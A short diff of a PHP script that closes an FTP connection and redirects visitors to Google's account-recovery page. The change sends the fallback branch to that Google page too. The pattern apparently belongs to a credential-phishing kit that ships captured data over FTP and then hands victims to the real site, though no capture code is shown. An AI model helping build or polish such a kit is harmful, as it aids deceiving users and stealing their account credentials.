@@ -31,8 +31,8 @@ header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
         // close ftp stream
         ftp_close($ftpcon);
     }
-    else
-        header('Location: index.php');
+    else {
+        header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 }
 exit();
 ?>
